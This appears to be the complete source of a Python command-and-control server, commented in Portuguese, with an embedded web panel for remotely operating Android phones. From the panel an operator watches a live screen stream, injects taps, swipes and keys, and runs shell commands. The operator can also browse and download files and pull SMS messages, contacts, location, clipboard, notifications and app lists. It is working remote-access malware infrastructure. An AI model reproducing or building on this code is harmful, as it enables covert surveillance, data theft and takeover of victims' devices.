# server.py - C2 local, porta unica 8080, token obrigatorio
# painel: http://localhost:8080/?t=TOKEN   celular: /ws?t=TOKEN   viewer: /panel?t=TOKEN
import asyncio, base64, json
from aiohttp import web, WSMsgType

TOKEN = "3f7cm0ygvhr5w8"
DEVICES = {}
VIEWERS = set()

PAGE = r"""<!doctype html><html><head><meta charset="utf-8"><title>aval</title>
<style>
body{margin:0;background:#111;color:#ddd;font:13px system-ui;display:flex;height:100vh}
#left{flex:1;display:flex;flex-direction:column;min-width:0}
#bar{padding:5px;display:flex;gap:4px;flex-wrap:wrap;background:#1b1b1b;align-items:center}
button{background:#2b2b2b;color:#ddd;border:1px solid #444;padding:4px 7px;cursor:pointer;font-size:12px}
button:hover{background:#3a3a3a}
#img{flex:1;object-fit:contain;background:#000;min-height:0;cursor:crosshair}
#st{padding:3px 6px;font:11px monospace;color:#f66;min-height:14px}
#right{width:330px;display:flex;flex-direction:column;border-left:1px solid #333}
#log{flex:1;overflow:auto;padding:6px;font:11px monospace;white-space:pre-wrap;word-break:break-all}
#row{padding:6px;display:flex;gap:4px;align-items:center}
input[type=text]{flex:1;background:#222;color:#ddd;border:1px solid #444;padding:5px}
select{background:#222;color:#ddd;border:1px solid #444;padding:3px;max-width:200px}
</style></head><body>
<div id="left">
<div id="bar">
<select id="dev"><option value="">-- aparelho --</option></select>
<button onclick="k(4)">Voltar</button><button onclick="k(3)">Home</button><button onclick="k(187)">Recentes</button>
<button onclick="k(26)">Notif</button>
<button onclick="cmd('shot',{on:true})">Print ON</button><button onclick="cmd('shot',{on:false})">Print OFF</button>
<button onclick="cmd('ov',{on:true})">Overlay ON</button><button onclick="cmd('ov',{on:false})">Overlay OFF</button>
<button onclick="cmd('screen',{on:true})">Acordar</button>
<button onclick="cmd('torch',{on:true})">Luz</button><button onclick="cmd('torch',{on:false})">Luz off</button>
<button onclick="cmd('sms',{})">SMS</button><button onclick="cmd('contacts',{})">Contatos</button>
<button onclick="cmd('apps',{})">Apps</button><button onclick="cmd('loc',{})">Local</button>
<button onclick="cmd('info',{})">Info</button><button onclick="cmd('notif',{})">Notifs</button>
<button onclick="cmd('clip',{})">Clip</button>
</div>
<img id="img">
<div id="st"></div>
<div id="row"><input id="txt" type="text" placeholder="texto, ou $comando shell, ou /ls /sdcard"><button onclick="send()">Enviar</button></div>
</div>
<div id="right">
<div id="row">Qualidade<input id="q" type="range" min="15" max="90" value="38" oninput="cmd('q',{v:+this.value})"></div>
<div id="row">FPS<input id="f" type="range" min="1" max="15" value="8" oninput="cmd('fps',{v:+this.value})"></div>
<div id="row"><button onclick="cmd('play',{})">Play/Pause</button><button onclick="cmd('vol',{dir:-1})">Vol-</button><button onclick="cmd('vol',{dir:1})">Vol+</button></div>
<div id="log"></div>
</div>
<script>
let ws,info={w:0,h:0},lastF=0,sel='';
const img=document.getElementById('img'),log=document.getElementById('log'),
      st=document.getElementById('st'),dev=document.getElementById('dev');
const T=new URLSearchParams(location.search).get('t')||'';
function add(s){log.textContent+=s+"\n";log.scrollTop=log.scrollHeight}
function connect(){
const p=location.protocol==='https:'?'wss:':'ws:';
ws=new WebSocket(p+'//'+location.host+'/panel?t='+T);
ws.onopen=()=>add('[painel conectado]');
ws.onclose=()=>{add('[desconectado]');setTimeout(connect,2000)};
ws.onmessage=e=>{const m=JSON.parse(e.data);
  if(m.k==='frame'){if(m.id!==sel)return;lastF=Date.now();st.textContent='';img.src='data:image/jpeg;base64,'+m.d}
  else if(m.k==='devs'){const cur=dev.value;dev.innerHTML='<option value="">-- aparelho --</option>';
    m.d.forEach(d=>{const o=document.createElement('option');o.value=d.id;
      o.textContent=d.id+' '+d.m+' bat'+d.bat;dev.appendChild(o)});
    if(cur&&m.d.some(d=>d.id===cur))dev.value=cur;
    if(!sel&&m.d.length)st.textContent='selecione o aparelho na lista'}
  else if(m.k==='log'){const d=m.d;
   if(d.t==='hello'){info=d;add('['+d.id+'] '+d.m+' sdk'+d.sdk+' '+d.w+'x'+d.h+' bat'+d.bat+' ip'+d.ip)}
   else add(d.t+': '+(d.o||''))}};
}
setInterval(()=>{if(!lastF||Date.now()-lastF>2500)st.textContent=sel?'sem frames do aparelho':'nenhum aparelho selecionado'},1000);
dev.onchange=()=>{sel=dev.value;lastF=0;img.removeAttribute('src');add('[*] selecionado '+(sel||'nenhum'))};
function cmd(c,x){if(ws&&ws.readyState===1&&sel)ws.send(JSON.stringify(Object.assign({c,id:sel},x)))}
function k(code){cmd('key',{code})}
function send(){const t=document.getElementById('txt'),v=t.value.trim();if(!v)return;
if(v[0]==='$')cmd('shell',{cmd:v.slice(1)});
else if(v.startsWith('/ls '))cmd('ls',{p:v.slice(4)});
else if(v.startsWith('/dl '))cmd('dl',{p:v.slice(4)});
else cmd('text',{s:v});t.value=''}
document.getElementById('txt').addEventListener('keydown',e=>{if(e.key==='Enter')send()});
function pt(ev){const r=img.getBoundingClientRect();
const sx=info.w&&img.naturalWidth?info.w/img.naturalWidth:1;
const sy=info.h&&img.naturalHeight?info.h/img.naturalHeight:1;
return{x:Math.round((ev.clientX-r.left)*(img.naturalWidth/r.width)*sx),
        y:Math.round((ev.clientY-r.top)*(img.naturalHeight/r.height)*sy)}}
let down=null,dt=0;
img.addEventListener('mousedown',e=>{down=pt(e);dt=Date.now()});
img.addEventListener('mouseup',e=>{const u=pt(e);if(!down)return;
const d=Math.abs(u.x-down.x)+Math.abs(u.y-down.y);
if(d<12&&Date.now()-dt>600)cmd('long',{x:u.x,y:u.y});
else if(d<12)cmd('touch',{x:u.x,y:u.y});
else cmd('swipe',{x1:down.x,y1:down.y,x2:u.x,y2:u.y,ms:260});down=null});
connect();
</script></body></html>"""


def authed(req):
    return req.query.get("t") == TOKEN


async def _s(ws, d):
    try:
        await ws.send_str(d)
    except Exception:
        pass


async def push(o):
    d = json.dumps(o)
    await asyncio.gather(*[_s(v, d) for v in list(VIEWERS)], return_exceptions=True)


async def push_log(o, dev=None):
    await push({"k": "log", "d": o, "id": dev})


async def push_devs():
    d = [{"id": k, "m": v["info"].get("m", "?"), "bat": v["info"].get("bat", -1)}
         for k, v in DEVICES.items()]
    await push({"k": "devs", "d": d})


async def index(req):
    if not authed(req):
        return web.Response(text="token invalido: use /?t=SEU_TOKEN", status=403)
    return web.Response(text=PAGE, content_type="text/html", charset="utf-8")


async def phone(req):
    if not authed(req):
        return web.Response(text="token invalido", status=403)
    if req.headers.get("Upgrade", "").lower() != "websocket":
        host = req.headers.get("Host", "localhost:8080")
        tls = req.secure or req.headers.get("X-Forwarded-Proto") == "https"
        return web.Response(text=("%s://%s/ws?t=%s\n" % ("wss" if tls else "ws", host, TOKEN)))

    ws = web.WebSocketResponse(heartbeat=15, max_msg_size=0)
    await ws.prepare(req)
    dev = None
    try:
        async for m in ws:
            if m.type == WSMsgType.BINARY:
                d = base64.b64encode(m.data).decode()
                await asyncio.gather(
                    *[_s(v, json.dumps({"k": "frame", "d": d, "id": dev}))
                      for v in list(VIEWERS) if getattr(v, "sel", None) == dev],
                    return_exceptions=True)
            elif m.type == WSMsgType.TEXT:
                try:
                    o = json.loads(m.data)
                except Exception:
                    o = {"t": "raw", "o": m.data}
                if o.get("t") == "hello":
                    dev = o.get("id", "?")
                    DEVICES[dev] = {"ws": ws, "info": o}
                    print("+ %s conectado (%d aparelhos)" % (dev, len(DEVICES)))
                    await push_devs()
                await push_log(o, dev)
    except Exception as e:
        print("  ! erro no aparelho %s: %s" % (dev, e))
    finally:
        if dev and DEVICES.get(dev, {}).get("ws") is ws:
            DEVICES.pop(dev, None)
            print("- %s desconectado (code=%s)" % (dev, ws.close_code))
            await push_devs()
    return ws


async def panel(req):
    if not authed(req):
        raise web.HTTPForbidden(text="token invalido")
    ws = web.WebSocketResponse(heartbeat=15, max_msg_size=0)
    await ws.prepare(req)
    ws.sel = None
    VIEWERS.add(ws)
    await push_devs()
    try:
        async for m in ws:
            if m.type != WSMsgType.TEXT:
                continue
            try:
                o = json.loads(m.data)
            except Exception:
                continue
            target = DEVICES.get(o.get("id"))
            if not target:
                await _s(ws, json.dumps({"k": "log", "d": {"t": "err", "o": "aparelho offline"}}))
                continue
            ws.sel = o.get("id")
            try:
                await target["ws"].send_str(json.dumps({k: v for k, v in o.items() if k != "id"}))
            except Exception:
                pass
    except Exception:
        pass
    finally:
        VIEWERS.discard(ws)
    return ws


async def health(req):
    return web.json_response({"ok": True, "devices": list(DEVICES)})


def main():
    app = web.Application()
    app.router.add_get("/", index)
    app.router.add_get("/ws", phone)
    app.router.add_get("/panel", panel)
    app.router.add_get("/health", health)
    print("painel -> http://localhost:8080/?t=%s" % TOKEN)
    web.run_app(app, host="0.0.0.0", port=8080, print=None, access_log=None)


main()